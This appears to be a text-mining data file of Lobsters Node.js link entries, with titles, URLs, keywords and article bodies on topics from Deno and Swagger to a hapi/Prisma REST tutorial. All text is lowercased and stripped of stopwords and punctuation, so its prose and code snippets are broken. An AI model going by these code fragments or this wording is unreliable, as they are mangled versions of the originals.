multiple node volume plugins cephfs glusterfs nfs enable reliability performance shared access filesystems issue furthermore unsupported gcp sourcegraphcom deployed solution factor responsibility managing shared storage separate service bundle manager originally called lsifdumpmanager today known precisecodeintelbundlemanager made lsifserver lsifworker stateless freeing scale horizontally scaling bundle manager requires sharding scheme similar already used gitserver service responsible serving git data sourcegraph backend rewriting go original lsif backend written typescript easiest prototype also matched technical skillset original team time performance became consideration experience team shifted toward go particular familiar variety technique optimize program written go le wellversed technique application written typescript performance becoming firstorder consideration decided rewrite thing go initially decided adopt strangler fig model refactoring extracting first cpubound work highperformance go process would called existing worker code eventually time logic would ported go process however thing nt always go according plan knew in out typescript code simply rewrote three service go single pas resulting code nt particularly idiomatic since wanted focus bringing new system life quickly possible could sunset old one continuing refactors made code idiomatic time rewrite unlocked large number performance improvement opportunity result described optimizing code intelligence backend removing lsifserver rewriting lsif backend go lsif api server lsifserver completely stateless longer talk process bundle manager written different language taking step back realized api server process little purpose moved remained lsif api server logic server handler client used part sourcegraph external http graphql apis query lsif data dropped lsif api server looking forward journey nt stopping made significant performance improvement lsif backend continue adding feature investing optimization support massive scale lsif thing looking forward automatic zeroconfig lsif indexing repository support monorepos large repository high commit frequency creating public index opensource code connecting private code enable seamless jumping proprietary code opensource dependency keep eye update
17,Lobsters,nodejs,Node.js programming,How many AWS services do you need to host a static webpage? (1/2),https://medium.com/warsawjs/how-many-aws-services-do-you-need-to-host-a-static-webpage-1-2-b811929a9436,many aws service need host static webpage,many aws service need host static webpage dallas reedy unsplash j modification shouldhide vif shouldhide click startpage startpage sessionstoragesetitem shouldhide true xmlhttprequest const counter jsonparse reqrespresponsetext counter vm emit gotcounter counter sessionstoragesetitem counter counter const work fetch arrow function sessionstorage eu cookie law,many aws service need host static webpage photo dallas reedy unsplashthe public cloud happening periodi knew awsazuregcp service name function really wanted gain handson experience using themas probably programmer created couple webpage one member family ashamed look like still maintain recently change hosting decided use aws needed achieve wantedjs modificationsfirst thing first let start j code webpage almost static visitor counter php script using text file store number visitor increment worse html frame get around problem calculating visit refreshing pagei almost never used vue natural choice created component indexhtml main context webpagefor intro disappearing first click const intro data function return shouldhide sessionstoragegetitem shouldhide template div vif shouldhide click startpage style img src imgbgjpg style div method startpage function const vm vmshouldhide true sessionstoragesetitem shouldhide true const reqresp new xmlhttprequest reqresponreadystatechange function reqrespreadystate reqrespstatus const counter jsonparse reqrespresponsetext counter vm emit gotcounter counter sessionstoragesetitem counter counter reqrespopen get url true reqrespsend old browser supported configuring babel build script much const work fetch arrow function twhy http request see emitted event name something connected new counter mechanism come back lateralso get around multiple visit refresh problem sessionstorage localstorage answer eu cookie law seems sessionstorage require terrible cookie policy info webpage
18,Lobsters,nodejs,Node.js programming,Kicking Node into high gear for data processing or how to hire 100 cats to catch a mouse,https://sgolem.com/kicking-node-into-high-gear-for-data-processing-or-how-to-hire-100-cats-to/,kicking node high gear data processing hire cat catch mouse,callback hell promise tokio asyncstd wait something time sequential lot time promisified concurrent per thing spawn multiple thread boost processing,recently came across problem work required light processing across hundred directory initial run nt take long figured whatever could speed would pay long run anticipated need run dozen hundred time got right asked year ago exactly node event loop work say idea today happy say still nt know work least detail meantime learned good chunk rust asyncawait internals pushed right direction understanding asyncawait faster node even though singlethreaded shortest introduction asyncawait syntax imagine remember callback diabolical mess could make okay maybe u probably significant percentage nesting callback could easily produce code hard follow sometimes hard understand even rereading people call phenomenon callback hell came promise promise clean readable code even dealing async process straightforward combine promise chain sequentially process data despite people still tended nest promise logic understandable chosen one would usually last month understanding would decay logical next step rewrite period time someone idea could write async code way write sync code asyncawait born great idea dug tokio asyncstd idea worked speed something run single thread seems code mostly nothing specific wait something time sure everybody fired http request numerous time playing node read file transformed content logged wrote result file appears thing like take considerable amount time waiting o right task network connection might slow congested drive might slow dying network destination might slow far let see happens fire lot sequential network request start request waiting something getting data end request oooo ooo oo ooooooooooooooo lot nothing going request running time mean useful work waiting oooo oo oo oo ooooooooooo oooo oooo take closer look see new data processed single request time request run faster even single thread course adding thread could result much better time could slow whole thing later might realize constantly jumping one request therefore must sort overhead honest nt know much impact either way realworld task would lot waiting data decrease overhead minimum like everything else need reason use asyncawait reading file script might well use sync worry use case async might shine hundred file read network call nodejs quite limited come make super easy run thing sequentially one one time tool workload let see kind api would suitable case use promisified function keep code clean const work filepath const content await fsreadfile filepath const json jsonparse content const url jsondetailsdocumentation const re await fetch url return resbody know need done probably safe assume filepaths array matter obtained const filepaths simplest form api think const documentationpages await pareach work filepaths might also accept option object third parameter let leave later basic shell pareach function could go something like const pareach async work allargs option todo option object contain many configurables let focus number concurrent parallel worker run const batchsize option need variable see much work done know stop code inside pareach function let callwhendone let workerspawned let nextargsindex let write part actual work const spawn const args allargs nexargsindex arrayisarray args work args else work args workersspawned nextargsindex straightforward see happening spawn function get right argument check one multiple start work update variable accordingly probably noticed function let see one look const workersspawned const allargsused nextargsindex allargslength const allworkerswork workersspawned batchsize const noworkerswork workersspawned allworkerswork allargsused spawn noworkerswork allargsused callwhendone also update workersspawned variable work done checking see good time work wrap finish everything one thing left write kickstarting let batchsize spawn return new promise resolve callwhendone resolve fire worker defined batchsize variable save resolve function unblock awaiting pareach function called already published package play check pareach npm spent lot time searching name taken one mixture parallel foreach almost sound like something per thing whatever spawn multiple thread boost processing even check speedup sequential took second concurrent took second parallelized took second produced waiting random sub second timeouts firing hundred request yield similar ratio like know something like useful please clone repo try running test see much pareach version faster sequential processing
19,Lobsters,nodejs,Node.js programming,Fuzzy search your GitHub starred repositories from your terminal,https://github.com/Link-/starred_search,fuzzy search github starred repository terminal,starredsearch installation minimum requirement setup usage example output nonverbose output verbose output parsing output jq jq release history api breaking change api breaking change,starredsearch search starred repository github keyword notice project still alpha api might change without notice update reviewing changelog breaking change know repository like star abyss yes cli tool help fuzzy search search github user starred repository providing handle tool cache result locally nt risk abusing api request limit installation minimum requirement setup o x linux install npm install starredsearch g usage starredsearch user link cachedir tmpcache find recommend create alias shell avoid repeating required parameter example alias fish bash create alias temporary might want make permanent alias star starredsearch user link cachedir tmpcache use star f usage usage starredsearch option args search user starred repository github keyword option h help show message exit u user handle github handle example link c cachedir directory directory want store cache file example tmpcache f find keyword keyword want search example l limit number limit search result specified number default v verbose output debugging log v version output release version example output nonverbose output starredsearch user link find reponame repodescription overview ecmascript feature repourl http repostars reponame repodescription generate compatible feed airline bigquery rocket repourl http repostars reponame repodescription cheatsheet containing tip trick best practice code snippet repourl http repostars verbose output starredsearch user link cachedir tmpcache find verbose info searching link starred catalogue info serving search result cache reponame repodescription overview ecmascript feature repourl http repostars reponame repodescription generate compatible feed airline bigquery rocket repourl http repostars reponame repodescription cheatsheet containing tip trick best practice code snippet repourl http repostars parsing output jq pipe standard output handled tool like jq magic return first search result starredsearch u link f jq reponame repodescription overview ecmascript feature repourl http repostars return reponame every result element starredsearch u link f jq map reponame release history api breaking change change alias verbose v v add v version option added h help option added l limit option limit search result added alias documentation api breaking change add verbose flag fix output return valid json fix output return result array instead separated object
21,Lobsters,nodejs,Node.js programming,"Choose between Formidable, Busboy, Multer and Multiparty for processing file uploads",https://bytearcher.com/articles/formidable-vs-busboy-vs-multer-vs-multiparty/,choose formidable busboy multer multiparty processing file uploads,breakdown popular package formidable busboy multer multiparty formidable busboy multer multiparty use formidable multer proof concept low volume without express use formidable expressjs file memory use multer expressjs temporary file disk use multer formidable use busboy highvolume productiongrade solution visual guide,npm package reading processing multipartformdata request nodejs server design philosophy meant used expressjs standalone store intermediate file hard disk memory digging choosing one right take time guide deciding library suit best diving want decide need expressjs saving intermediate file ok want stream file saving intermediate file alright would prefer memory hard disk breakdown popular package formidable around longest released version also weekly downloads npm expressjs specific save file temporary directory hard disk busboy eventbased streaming parser tied expressjs instead storing intermediate file provides stream incoming file around since core multipartformdata implementation extracted separate dicer module multer expressjs middleware around since save intermediate file either memory hard disk populates reqfiles object consuming file finegrained control field allow file limit number uploaded file internally multer us busboy multiparty fork formidable around functionality multiparty also allows streaming file however documentation multiparty recommends using busboy faster alternative formidable busboy multer multiparty npm weekly downloads year expressjs middleware stream intermediate file disk intermediate file memory breakdown popular file upload processing library use formidable multer proof concept low volume case nt mind storing intermediate file could writing prototype going admin user handling file upload duty either way nt mind server potentially getting busted memory running hard disk filling perfectly ok case think need express whether like file memory hard disk without express use formidable want process file uploads outside expressjs got two option formidable multiparty multiparty fork formidable added stream multiparty recommends using busboy formidable user thus case something break likely get help formidable community keep mind case nt option storing file memory saving temp file disk expressjs file memory use multer use standalone library together expressjs got three option formidable multer multiparty want store file memory easy pick multer support expressjs temporary file disk use multer formidable want save file temporary directory disk got two option multer formidable good choice solid userbase want finegrained control input field allow file limit number file go multer choosing right library intermediate file use busboy highvolume productiongrade solution got highvolume situation want reliability server best option store intermediate file nodejs server instead want push file separate file server soon receive file server cloud storage service aws database support blob make happen stream optimal way handling incoming file data alternative busboy multiparty since multiparty recommends using busboy easy pick use busboy visual guide visual guide looking choice related article
22,Lobsters,nodejs,Node.js programming,Deno is a Browser for Code,https://kitsonkelly.com/posts/deno-is-a-browser-for-code/,deno browser code,browser discovering code repeatable build trusting code dependency management line code time week snowpack oak server pika cdn importmaps origin trial chrome,started contributing deno soon ry made prototype visible may frequent question people package manager often time even form question statement like thought deno took security seriously downloading resource internet insecure possibly manage dependency opinion need shift mental model lot folk take ubiquity package manager centralized code registry requirement package manager centralized code registry exist mean required came existence solved problem particular way accepted way solve problem would argue true browser order publish website login central google server upload website registry someone want view website use command line tool add entry browserjson file local machine go fetch whole website plus website one website link local website directory fire browser actually look website would insane right accept model running code deno cli work like browser code import url code deno go fetch code cache locally like browser also like browser code run sandbox zero trust code running irrespective source person invoking code get tell code externally also like browser code ask permission thing choose grant deny http protocol provides everything needed provide information code deno try fully leverage protocol without create new protocol discovering code first thing think like browser deno cli want opinion code run lay rule code fetched sandbox machine run opinion much opinion runtime nodejsnpm ecosystem conflated management code local machine centralized registry code help facilitate discovery opinion really bad flaw back early day internet experimented npm type discoverability would go add website yahoo right categorization people would come along maybe use search function structured based opinion providing content really based optimizing need consumer eventually along came google google win useful indexed website way matched simple expression need search term relevant web page met need looking multiple factor including meta data provided content provider one factor mix model quite yet code deno model work addition use google solves problem u instead told must use google well also viable alternative google got bit debate laurie voss twitter someone know fair deal npm ecosystem would say argued deno needed package manager blog post longer winded version thought wanted express laurie raised valid point github become home open source code useful solved problem built top de facto source code versioning tool git deno cli perspective technical restriction source code wider ecosystem create evolve way make code deno discoverable probably innovative way could never conceived u creating cli repeatable build npm ecosystem became problem heavy reliance semantic versioning complex dependency graph tend come nodejsnpm ecosystem repeatable build became real problem yarn introduced concept lock file npm followed suit personal feeling bit tail wagging dog behaviour developer ecosystem created problem needed imperfect solution fix u lived ecosystem long time know fix lot issue rm rf nodemodules packagelockjson npm install said deno two solution first deno cache module cache checked source control cachedonly flag ensure attempt retrieve remote module denodir environment variable used specify cache located provide flexibility second deno support lock file lock lockjson lockwrite would write lock file hash dependency given workload would used validate future run lock lockjson used also couple command make managing repeatable build deno cache would resolve dependency supplied module populate deno cache deno bundle used generate single file build workload dependency resolved included file single file needed future deno run command trusting code another area think skewed mental model whatever reason put trust code centralized registry even think trust code fully vetted dependency trusted quick search type npm install somerandompackage think fine argue rich npm package ecosystem lulled sense complacency compensate laxness complacency implement security monitoring software tool chain analyse dependency thousand upon thousand line code let u know maybe code exploitable corporation setup private registry host package might vetted slightly single public registry feel like elephant room best strategy trust code established opening back becomes little easier lying think package manager centralised registry solve problem even substantially help problem fact argue make use let guard well npm bad surely someone would take deno aspect quite done think starting good position zero trust startup provides fairly fine grained permission one thing personally dislike flag basically saying oh yeah allow everything easy thing frustrated developer instead figuring really need also hard break permission say code code code prompt escalate privilege code coming hopefully figure easy use mechanism coupled something would effective performant runtime try solve challenge recent change though good one opinion deno longer allows downgrade import something imported http import http location follows browser model able downgrade transport still think longer term would good kill remote import http much like service worker require http see future hold dependency management think need talk frankly dependency npm ecosystem honest broken ecosystem enables line code downloaded installed million time week code every browser last year never needed nodejs broken ecosystem one example actual code byte package size runnable code package size fine opinion several factor involved big part model inverted talked deno browser code problem backwards model infected create website central registry build website download code depend bake something load server user downloads bunch code local machine evidence around code downloaded unique site web application rest code downloading development workstation bundling model broken problem solution like snowpack trying solve another significant problem dependency coupled code put dependency packagejson code actually us code totally decoupled code express using code loosely coupled version code contained packagejson though biggest impact code write code actually consuming dependent code lead u deno model like call depsinjs since cool kid injs thing explicitly stating external dependency url mean code depends upon code concise clear code dependency tightly coupled together want see dependency graph simply need use deno info local remote module deno info http denolandxoakexamplesserverts local type typescript compiled denogenhttpsdenolandxoakexamplesservertsjs map denogenhttpsdenolandxoakexamplesservertsjsmap deps http denolandxoakexamplesserverts http denolandstd http denolandxoakmodts http denolandxoakapplicationts http denolandxoakcontextts http denolandxoakcookiests http denolandxoakhttperrorts http denolandxoakdepsts http denolandstd http denolandstd http denolandstd http denolandstd http denolandstd snip deno strong opinion around version code url url url deno requires appropriate medium type order understand treat code opinion code serve left web server server implement semantic versioning heart content sort magical mapping url resource want deno care example http denolandx effectively nothing url redirect server rewrite url include git commitish reference redirected url http denolandxoak becomes http github serf nice versioned module course spreading versioned remote url throughout codebase make lot sense great thing dependency code though structure way want common convention use depsts reexports dependency might want take look one oak server copyright oak author right reserved mit license file contains external dependency oak depends upon std dependency export http denolandstd export response serve server serverrequest servetls http denolandstd export status statustext http denolandstd export cooky cookie setcookie getcookies delcookie http denolandstd export basename extname join isabsolute normalize parse resolve sep http denolandstd export assert http denolandstd party dependency export contenttype lookup http denolandxmediatypes created oak server maintained month release deno deno std library including moving mediatypes internal oak std library ejected std library thing think hey need package manager manage one benefit typescript get comprehensive validation compatibility code code dependency raw typescript written deno great let say want take advantage preprocessing typescript javascript still ability consume remote code safely deno support couple different way allow happen seamless support xtypescripttypes header header indicates deno type file located used type checking javascript file depending upon pika cdn support package available cdn type associated serve header deno also fetch type use type checking file said may still need remap remote local dependency expressed code case unstable implementation importmaps used proposal specification part incubator browser standard come allows map provided map particular dependency code another resource local file remote module implemented deno extended period time really hoped would become adopted widely sadly origin trial chrome gotten wider adoption yet led u putting behind unstable flag deno personal opinion still big risk dead end avoided suspect lot people still coming list objection model deno think strategy deno tried take aligned deal real problem arise lot objection hear people new deno worked tried understand might different way said collectively run problem compelling need change something deno cli confident happen lot problem simply exist way solve require runtime strong opinion coupled external programme manage code challenge flirt bit package manager centralised package repository see go might never go back
23,Lobsters,nodejs,Node.js programming,"Today’s Javascript, from an outsider’s perspective",http://lea.verou.me/2020/05/todays-javascript-from-an-outsiders-perspective/,today javascript outsider perspective,john lea node john lea node lea lea lea john firefox lea john firefox john lea firefox lea lea john,today tried help friend great computer scientist j person use j module found github since past year day job usability research teaching mit help cringe slog lo behold pile unnecessary error condition cryptic error lack proper feedback feel good job communicating frustration went one hour gave went bit like note name package people changed protect identity also omitted issue faced specific package hand error reconstructed memory let know got anything wrong john hey want try algorithm found github say use import functionname packagename call functionname argument seems simple enough really need ui gon na use node lea sure node seems appropriate john run npm install packagename save recommended package readmejohn run node indexjs node warning load e module set type module packagejson use mjs extension syntaxerror use import statement outside module john run npm init generate john run npm init go wizard add type module manually generated packagejsonjohn run node indexjs node syntaxerror use import statement outside module oddly error thrown internal module project time wat lea ok screw run browser module pure j algorithm use node apis work john make simple indexhtml script type module src indexjs john load indexhtml browser nothing console nada cricket lea oh need adjust module path import packagename node special stuff resolve based nodemodules browser need specify explicit path john look filesystem nodemodules directory lea oh ran npm install packagejson probably try john run npm install packagename save john oh yeah nodemodules john desperately look nodemodules find entry pointjohn edits indexjs accordingly reloads indexhtml firefox incorrect mime type texthtml lea oh file dude day without localhost javascript severely restricted file today john ok fine going start localhost john start localhost visit indexhtml http firefox incorrect mime type texthtml john sigh need configure localhost serve j file textjavascript mime type lea know look network tab suspect find module returning html page complains mime type error page textjavascript look nodemodules corrects path turn v code collapse folder subfolder noticed fwiw think good usability improvement v code behalf improves efficiency need make visible happened firefox syntaxerror missing formal parameter lea coming package source fault look line john click line throwing error lea oh goodness javascript typescript j extension john wanted run one line code test john give concludes never touch node npm module barge pole end note john computer scientist know fair bit web node npm installed knew mime type could start localhost needed hope actual novice
24,Lobsters,nodejs,Node.js programming,What I don't like about Node.js,https://steelbrain.me/2020/05/17/what-i-dont-like-about-node-js.html,nt like nodejs,nt like nodejs nodejs webpack rollup parcel pundle magicstring require javascriptcore voodooattack nexusjs concurrent variable access,nt like nodejs may nodejs javascript runtime built chrome javascript engine working nodejs many year part pleasant productive experience prototyping speed ability scale quickly written particularly optimized code amazing often fall short try optimize tho hit architectural limitation faster expect please keep mind rant product representing time reading future may longer true would hope short version proper multi threading atomic object access long version personal experience short coming nodejs come result trying write fast module bundler nodejs case know module bundler like webpack rollup parcel deprecated pundle piece software take program dependency bundle single file sometimes chunk often consumed browser module bundlers let require import dependency browser without hassle writing script tag hand maintain order dependency configure much gist module bundler become widely successful configurable work well reasonably fast configurability reasonably fast difficult achive together come learn experience example control step pipeline parse file continue work ast onwards making configurable mean step much pas resultant string buffer next step module bundlers current time work around manipulating string directly using magicstring something similar using allows infer trivial thing replace import internal reference making pipeline configurable however mean someone could put babel transpilation terser minification directstringmanipulation going stop parsing reparsing another thing make difficult impossible scale number core fact share object thread nodejs ipc nodejs quite expensive expensive enough architect module bundler one process nothing task others even end bottlenecked ipc overhead serializing unserializing thousand file state different step pipeline mention want avoid reparsing file ast much much bigger source require metadata file bundle generate source map nodejs recently got proper multi threading support via workerthreads even allow sharing actual object transferring ownership buffer source lack ability transfer object instead buffer per unverified source lock entire virtual machine thread try call something parallel module bundler limited fundamental limitation engine like trying run horse race one horse work around javascriptcore j engine used inside safari however lock entire virtual machine specific execution context attempt voodooattack create runtime top rival compliment nodejs called nexusjs available github support concurrent variable access among cool thing sadly gotten love deserved module bundlers ported nexusjs change remove current worker pooling implementation would run many many time faster ala reading
25,Lobsters,nodejs,Node.js programming,The Easiest Way To Start Using Swagger in Node.js,https://medium.com/@Grantlyk/the-easiest-way-to-start-using-swagger-in-node-js-54326864e74f,easiest way start using swagger nodejs,easiest way start using swagger nodejs article go swagger might want use easiest way start using nodejs express api swagger would want use swagger document api openapi good easiest way add swagger existing api swagger ui express creating swagger definition swagger doc getting swagger additional tool swagger node swagger editor swagger codegen conclusion,easiest way start using swagger nodejsthis article go swagger might want use easiest way start using nodejs express apiwhat swagger swagger set tool developer use make building apis simpler primarily use swagger document api however swagger provides tool aid designing developing documenting testing api article focusing documenting apiwhy would want use swagger document api swagger us openapi specification considered world standard restful apis swagger tool built team behind original specification know tool built specification mindwhy openapi good openapi specification defines standard allows human machine easily understand discover capability service without access source code documentation network traffic basically writing written openapi specification read herebut short complete openapi specification relating api generate everything else generate documentation could even generate source code specification openapi language agnostic generate source code various programming language although thing outside scope articleso easiest way add swagger existing api easiest way start using swagger nodejs express api make use swagger ui express allows serve doc based jsonyaml file provide itwe need install swaggeruiexpress via npmnpm install save swaggeruiexpressproviding using need import swaggeruiexpress swagger definition go create soon serve route choosing case call apidocs import swaggerui swaggeruiexpress import swaggerdocument swaggerjson appuse apidocs swaggeruiserve swaggeruisetup swaggerdocument personally prefer declare swagger definition yaml rather json point usually install yamljs step optionalnpm install save yamljsi modify previous swaggeruiexpress setup look like following import swaggerui swaggeruiexpress import yaml yamljs const swaggerdocument yamlload swaggeryaml appuse apidocs swaggeruiserve swaggeruisetup swaggerdocument creating swagger definitionthe final part get swagger working create swagger definition file use swaggeruiexpress generate documentation create json yaml purpose article using yaml example swagger definition example see specifying openapi version got info section give meta data api title description version number also got server section specify different environment production staging integration developmentinside path start defining api route example defining user route saying perform get request route result making request http response return json payload payload array stringsyou read definition file swagger doc go depth specification good way get started swagger couple application anything easy remove reality added couple line code module api meaning decide swagger take lot remove itgetting swaggerthere definitely way get swagger like using swagger inspector inspect existing api generate swagger definition based think writing swagger definition good first step give better understanding openapi actually done hoodthere downside maintain definition work extend api working api constantly changing better way example could allow definition live alongside code making use swagger integration tool jsdoc could make use tool generate definition inspector mentioned abovein reality developer really maintaining creating documentation one form another wether generating writing usually people write documentation group brainer instead write maintain specification used generate documentation moreadditional toolsif looking different solution mind tight coupling take look swagger node cost tightly coupled code allows define swagger definition swagger editor meaning worry business logic recommend existing nodejs express apis starting something new sold swagger go right aheadif looking easy way generate stub api use swagger codegen achieve thisin conclusioni shown easily add swagger nodejs express api way allows dip toe without fully committing tool gone openapi specification would want use also touched start writing swagger definition also shown additional tool might want use really start getting swagger
26,Lobsters,nodejs,Node.js programming,"Building a Modern Backend with TypeScript, PostgreSQL and Prisma: REST API, Validation, and Testing",https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/,building modern backend typescript postgresql prisma rest api validation testing,introduction grading system online course series cover part part part learn today first article hapi rest api validation testing jest note checkpoint prerequisite assumed knowledge development environment nodejs docker prisma extension note local postgresql database hosted postgresql database heroku clone repository github note start postgresql note building rest api api rest github rest api endpoint path http method handler http status code list note api endpoint note github repository note hapi hapi creating server checkpoint http defining route checkpoint http moving route plugin plugins server interface checkpoint http defining test status endpoint jest note setup teardown checkpoint defining primsa plugin note comment checkpoint defining plugin user route dependency prisma plugin defining create user route type assertion note article adding validation create user route create test create user route note checkpoint defining testing get user route note checkpoint defining testing delete user route note checkpoint defining testing update user route method dry checkpoint summary next step github prisma data guide,introductionthe goal series explore demonstrate different pattern problem architecture modern backend solving concrete problem grading system online course good example feature diverse relation type complex enough represent realworld use casethe recording live stream available cover ground articlewhat series coverthe series focus role database every aspect backend development covering topicpartdata modelingpart api layerpart current validationpart current testingpart current authenticationcoming upauthorizationcoming upintegration external apiscoming updeploymentcoming upwhat learn todayin first article designed data model problem domain wrote seed script us prisma client save data databasein second article series build rest api top data model prisma schema first article use hapi build rest api rest api able perform database operation via http requestsas part rest api develop following aspect rest api implement http server resource endpoint handle crud different model integrate prisma hapi allow accessing prisma client api endpoint handlersvalidation add payload validation rule ensure user input match expected type prisma schematesting write test rest endpoint jest hapi serverinject simulate http request verifying validation persistence logic rest endpointsby end article rest api endpoint crud create read update delete operation test rest resource map http request model prisma schema eg get user endpoint handle operation associated user modelthe next part series cover aspect list detailnote throughout guide find various checkpoint enable validate whether performed step correctlyprerequisitesassumed knowledgethis series assumes basic knowledge typescript nodejs relational database experienced javascript nt chance try typescript still able follow along series use postgresql however concept apply relational database mysql additionally familiarity rest concept useful beyond prior knowledge prisma required covered seriesdevelopment environmentyou following installed nodejsdocker used run development postgresql database using visual studio code prisma extension recommended syntax highlighting formatting helpersnote nt want use docker set local postgresql database hosted postgresql database herokuclone repositorythe source code series found githubto get started clone repository install dependency git clone b git cd realworldgradingapp npm install note checking branch able follow article starting pointstart postgresqlto start postgresql run following command realworldgradingapp folder dockercompose note docker use dockercomposeyml file start postgresql containerbuilding rest apibefore diving implementation go basic concept relevant context rest apis api application programming interface set rule allow program talk typically developer creates api server allows client talk itrest set convention developer follow expose staterelated case state stored database operation http request example check github rest apiendpoint entry point rest api following property nonexhaustive path eg user used access user endpoint path determines url used access endpoint eg wwwmyapicomusershttp method eg get post delete http method determine type operation endpoint expose example get user endpoint allow fetching user post user endpoint allow creating usershandler code case typescript handle request endpointhttp status code response http status code inform api consumer whether operation successful error occurred check list different http status code eg resource created successfully consumer input fails validationnote one key objective rest approach using http application protocol avoid reinventing wheel sticking conventionsthe api endpointsthe api following endpoint http method followed path resourcehttp methodroutedescriptionuserpostuserscreate user optionally associate course usergetusers userid get useruserputusers userid update useruserdeleteusers userid delete userusergetusersget userscourseenrollmentgetusers userid coursesget user enrollement incoursescourseenrollmentpostusers userid coursesenroll user course student teacher courseenrollmentdeleteusers userid course courseid delete user enrollment coursecoursepostcoursescreate coursecoursegetcoursesget coursescoursegetcourses courseid get coursecourseputcourses courseid update coursecoursedeletecourses courseid delete coursetestpostcourses courseid testscreate test coursetestgetcoursestests testid get testtestputcoursestests testid update testtestdeletecoursestests testid delete testtest resultgetusers userid testresultsget user test resultstest resultpostcoursestests testid testresultscreate test result test associated usertest resultgetcoursestests testid testresultsget multiple test result testtest resultputcoursesteststestresults testresultid update test result associated user test test resultdeletecoursesteststestresults testresultid delete test resultnote path containing parameter enclosed eg userid represent variable interpolated url eg userid endpoint grouped based main modelresource associated categorization help organizing code separate module maintainabilityin article implement subset endpoint first four illustrate different pattern different crud operation full api available github repository endpoint provide interface operation resource delete endpoint deleting resource added laternote throughout article word endpoint route used interchangeably refer thing endpoint term used context rest route term used context http servershapithe api built hapi nodejs framework building http server support validation testing boxhapi consists core module named hapihapi http server module extend core functionality backend also use following hapijoi declarative input validation hapiboom httpfriendly error objectsfor hapi work typescript need add type hapi joi necessary hapi written javascript adding type rich autocompletion allow typescript compiler ensure type safety codeinstall following package npm install save hapiboom hapihapi hapijoi npm install savedev typeshapihapi typeshapijoi creating serverthe first thing need create hapi server bind interface portadd following hapi server srcserverts import hapi hapihapi const server hapiserver hapiserver port processenvport host processenvhost localhost export async function start promise hapiserver await serverstart return server processon unhandledrejection err consolelog err processexit start server consolelog server running serverinfouri catch err consolelog err first import hapi initialize new hapiserver type hapiserver defined typeshapihapi package connection detail containing port number listen host information start server log runningto run server locally development run npm devscript use tsnodedev automatically transpile typescript code restart server make change npm run dev npm run dev tsnodedev respawn srcserverts using tsnode version typescript version server running http checkpoint open http browser see following statuscode error found message found congratulation successfully created server however server route defined next step define first routedefining routeto add route use route method hapi server instantiated previous step defining route related business logic good practice add status endpoint return http status code useful ensure server running correctlyto update start function serverts adding following top export async function start promise hapiserver serverroute method get path handler h hapiresponsetoolkit return hresponse true code await serverstart consolelog server running serverinfouri return server defined http method path handler return object true lastly set http status code open http browser see following true moving route pluginin previous step defined status endpoint since api expose many different endpoint wo nt maintainable defined start functionhapi concept plugins way breaking backend isolated piece business logic plugins lean way keep code modular step move route defined previous step pluginthis requires two step define plugin new fileregister plugin calling serverstart defining pluginbegin creating new folder src named plugins mkdir srcplugins create new file named statusts srcplugins folder touch srcpluginsstatusts add following file import hapi hapihapi const plugin hapiplugin undefined name appstatus register async function server hapiserver serverroute method get path handler h hapiresponsetoolkit return hresponse true code export default plugin hapi plugin object name property register function would typically encapsulate logic plugin name property plugin name string used unique keyeach plugin manipulate server standard server interface appstatus plugin server used define status route register functionregistering pluginto register plugin go back serverts import status plugin follows import status pluginsstatus start function replace route call previous step following serverregister call export async function start promise hapiserver await serverregister status await serverstart consolelog server running serverinfouri return server checkpoint open http browser see following true congratulation successfully created hapi plugin encapsulates logic status endpointin next step define test test status endpointdefining test status endpointto test status endpoint use jest test runner together hapi serverinject test helper simulates http request server allow verify correctly implemented endpointsplitting serverts two filesto use serverinject method need access test server object plugins registered prior starting server avoid server listening request test run modify serverts look follows const server hapiserver hapiserver port processenvport host processenvhost localhost export async function createserver promise hapiserver await serverregister statusplugin await serverinitialize return server export async function startserver server hapiserver promise hapiserver await serverstart consolelog server running serverinfouri return server processon unhandledrejection err consolelog err processexit split replaced start function two function createserver register plugins initializes serverstartserver start servernote hapi serverinitialize initializes server start cache finalizes plugin registration start listening connection portnow import serverts use createserver test initialize server call serverinject simulate http requestsnext create new entry point application call createserver startserver create new srcindexts file add following import createserver startserver server createserver startserver catch err consolelog err lastly update dev script packagejson start srcindexts instead srcserverts dev tsnodedev respawn srcserverts dev tsnodedev respawn srcindexts creating testto create test create folder named test root project create file named statustestts add following file import createserver srcserver import hapi hapihapi describe status plugin let server hapiserver beforeall async server await createserver afterall async await serverstop test status endpoint return async const re await serverinject method get url expect resstatuscode toequal const response jsonparse respayload expect responseup toequal true test beforeall afterall used setup teardown function create stop serverthen serverinject called simulate get http request root endpoint test asserts http status code payload ensure match handlercheckpoint run test npm test see following output pas testsstatustestts status plugin status endpoint return m test suite passed total test passed total snapshot total time estimated ran test suite congratulation created plugin route tested routein next step define prisma plugin access prisma client instance throughout applicationdefining primsa pluginsimilar created status plugin create new file srcpluginsprismats file prisma pluginthe goal prisma plugin instantiate prisma client make available rest application serverapp object disconnect database server stopped serverapp provides safe place store serverspecific runtime application data without potential conflict framework internals data accessed whenever server accessibleadd following srcpluginsprismats file import prismaclient prismaclient import hapi hapihapi const prismaplugin hapiplugin null name prisma register async function server hapiserver const prisma new prismaclient serverappprisma prisma serverext type onpoststop method async server hapiserver serverappprismadisconnect export default prismaplugin define plugin instantiate prisma client assign serverapp add extension function thought hook run onpoststop event get called server connection listener stoppedto register prisma plugin import plugin serverts add array passed serverregister call follows await serverregister status prisma using vscode see red squiggly line serverappprisma prisma srcpluginsprismats file first type error encounter nt see line run compile script run typescript compiler npm run compile error property prisma exist type serverapplicationstate serverappprisma prisma reason error modified serverapp without updating type resolve error add following top prismaplugin definition declare module hapihapi interface serverapplicationstate prisma prismaclient augment module assign prismaclient type serverappprisma propertynote information module augmentation necessary check comment definitelytyped repositorybesides appeasing typescript compiler also make autocompletion work whenever serverappprisma accessed throughout applicationcheckpoint run npm run compile error emittedwell done defined two plugins made prisma client available rest application next step define plugin user routesdefining plugin user route dependency prisma pluginyou define new plugin user route plugin need make use prisma client defined prisma plugin perform crud operation userspecific route handlershapi plugins optional dependency property used indicate dependency plugins specified hapi ensure plugins loaded correct orderbegin creating new file srcpluginsusersts file user pluginadd following file import hapi hapihapi const usersplugin name appusers dependency prisma register async function server hapiserver export default usersplugin passed array dependency property make sure hapi load prisma plugin firstyou define userspecific route register function knowing prisma client accessiblelastly need import plugin register srcserverts follows await serverregister status prisma await serverregister status prisma user next step define create user endpointdefining create user routewith user plugin defined define create user routethe create user route http method post path usersbegin adding following serverroute call srcpluginsusersts inside register function serverroute method post path user handler createuserhandler define createuserhandler function follows async function createuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const payload requestpayload try const createduser await 